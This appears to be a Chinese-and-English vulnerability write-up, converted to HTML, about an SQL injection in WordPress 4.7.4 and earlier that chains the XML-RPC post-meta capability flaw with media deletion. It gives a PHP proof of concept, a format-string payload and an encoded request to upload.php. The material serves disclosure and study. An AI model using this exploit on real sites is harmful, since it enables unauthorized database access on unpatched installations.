<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>Wordpress &lt;= 4.7.4 XML-RPC API POST META 未校验漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><h2>三、复现过程</h2><h3>中文版</h3><p>以作者身份登录到您的wordpress</p><p>上传图片</p><p>记住图像/媒体的ID</p><p>创建帖子并将图像设置为特色图像（这将创建_thumbnail_id帖子元）</p><p>记住帖子ID</p><p>我们可以通过修改_thumbnail_id的值来编辑的值（6是帖子ID，5是图片/帖子ID）</p><h3>poc</h3><p>$usr = 'author';<br />$pwd = 'author';<br />$xmlrpc = 'http://local.target/xmlrpc.php';<br />$client = new IXR_Client($xmlrpc);<br />$content = array(&quot;ID&quot; =&gt; 6, 'meta_input' =&gt; array(&quot;_thumbnail_id&quot;=&gt;&quot;xxx&quot;));<br />$res = $client-&gt;query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content);</p><p>通过这段代码，我们在数据库中添加以下负载</p><p>5 %1$%s hello</p><p>执行SQL负载</p><p>使用作者帐户登录管理面板，转到媒体，例如</p><p>http://0-sec.org/wp-admin/upload.php</p><p>通过_wpnonce参数可以直接进行sql注入</p><p>http://0-sec.org/wp-admin/upload.php?_wpnonce=daab7cfabf&amp;action=delete&amp;media%5B%5D=5%20%251%24%25s%20hello</p><p>其中5 %1$%s hello的encode编码是5%20%251%24%25s%20hello这个请求将导致数据库执行以下查询（会有错误）</p><p>SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id' AND meta_value = '5 _thumbnail_id' hello'</p><p>这证明了Wordpress中的sql漏洞，正如5%1$%s之后的前一个post值中提到的，hello就是我们的payload</p><h3>英文原文</h3><p>In order to understand the writing here, you need to read the previous explanation <a href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94">https://medium.com/websec/wordpress-sqli-bbb2afcc8e94</a>. If you got it, then we can jump to the part and solve the question e.g. how to update / insert our sql payload into _thumbnail_id post meta.</p><h4><em>PoC start</em></h4><ul><li>Login to your wordpress as author</li><li>Upload image</li><li>Remember ID of the image / media</li><li>Create post and set image as featured image (this creates _thumbnail_id post meta)</li><li>Remember the post ID</li></ul><h4><em>Wordpress ≤ 4.7.4 XML-RPC</em></h4><p>n case of appropriate wordpress version then we can use the third vulnerability in this versions of wordpress <a href="https://wordpress.org/news/2017/05/wordpress-4-7-5/">https://wordpress.org/news/2017/05/wordpress-4-7-5/</a> e.g.</p><p>Lack of capability checks for post meta data in the XML-RPC API.</p><p>This means that we can edit the value of _thumbnail_id with the following code ( 6 is the post ID and 5 is image/post ID )</p><p>$usr = 'author';<br />$pwd = 'author';<br />$xmlrpc = 'http://local.target/xmlrpc.php';<br />$client = new IXR_Client($xmlrpc);<br />$content = array(&quot;ID&quot; =&gt; 6, 'meta_input' =&gt; array(&quot;_thumbnail_id&quot;=&gt;&quot;5 %1$%s hello&quot;));<br />$res = $client-&gt;query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content);</p><p>and with this code we add the following payload in the DB 5 %1$%s hello</p><h4><em>Wordpress importer plugin — any version of wordpress</em></h4><p>This is another approach for changing the _thumbnail_id value in the database. If wordpress instance have enabled this plugin on it, then simple export, change meta value and import will do the job.</p><h4><em>Execute the SQL payload</em></h4><p>Login to the administration panel with your author account, go to media e.g. <a href="http://local.target/wp-admin/upload.php">http://local.target/wp-admin/upload.php</a> , grab the _wpnonce value and we are ready to prove our SQLi vulnerability. Issue the following request towards your local instance:</p><p>local.target/wp-admin/upload.php?_wpnonce=daab7cfabf&amp;action=delete&amp;media%5B%5D=5%20%251%24%25s%20hello</p><p>where 5%20%251%24%25s%20hello is url encoded 5 %1$%s hello. This request will result with execution of the following query against the DB (will rise error of course):</p><p>SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id' AND meta_value = '5 _thumbnail_id' hello'</p><p>This proves the SQLi vulnerability in the wordpress and as mention in previous post value after 5 %1$%s e.g. hello is our payload</p><h4><em>Is this vulnerability dangerous?</em></h4><p>SQL injection itself is quite dangerous vulnerability, but sometimes have its own limitations. Here at our case depending of the database server configuration or mysql client used on PHP side could be fatal, but in our case best case scenario would be blind sql injection. Sure, we all know the trivial attack vector, but here we have 2 facts that go against wordpress:</p><p>meta value database column type e.g. size constraint</p><p>media parameter could be POST parameter e.g. will have huge size</p><p>This two facts guide us to the conclusion that even with blind sqli one query would be enough to calculate some crucial DB cell value.</p></body></html>